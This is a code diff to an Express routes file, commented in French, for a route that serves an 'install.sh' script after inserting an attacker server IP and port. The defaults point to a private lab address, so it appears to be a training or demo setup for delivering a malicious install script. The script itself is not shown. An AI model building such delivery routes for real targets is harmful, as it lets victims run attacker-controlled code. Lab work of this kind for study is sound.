@@ -4,7 +4,8 @@ import { storage } from "./storage";
 import { insertSurveyResponseSchema } from "@shared/schema";
 import { z } from "zod";
 import { readFileSync } from "fs";
-import { join } from "path";
+import { join, dirname } from "path";
+import { fileURLToPath } from "url";
 
 export async function registerRoutes(
   httpServer: Server,
@@ -14,10 +15,15 @@ export async function registerRoutes(
   // Servir le script d'installation
   app.get("/install.sh", (req, res) => {
     try {
-      const installScript = readFileSync(join(__dirname, "install.sh"), "utf-8");
+      // Obtenir le répertoire actuel (compatible ES modules)
+      const __filename = fileURLToPath(import.meta.url);
+      const __dirname = dirname(__filename);
+      
+      // Chemin vers install.sh (même dossier que routes.ts)
+      const installScriptPath = join(__dirname, "install.sh");
+      const installScript = readFileSync(installScriptPath, "utf-8");
       
       // Remplacer l'IP de l'attaquant dans le script
-      // L'IP de l'attaquant est celle du serveur qui héberge le serveur attaquant
       const attackerIp = process.env.ATTACKER_SERVER_IP || "192.168.56.101";
       const attackerPort = process.env.ATTACKER_SERVER_PORT || "8080";
       
@@ -30,7 +36,7 @@ export async function registerRoutes(
       res.send(modifiedScript);
     } catch (error) {
       console.error("Erreur lors de la lecture du script:", error);
-      res.status(500).send("Erreur lors du téléchargement du script");
+      res.status(500).send(`Erreur: ${error instanceof Error ? error.message : String(error)}`);
     }
   });
   
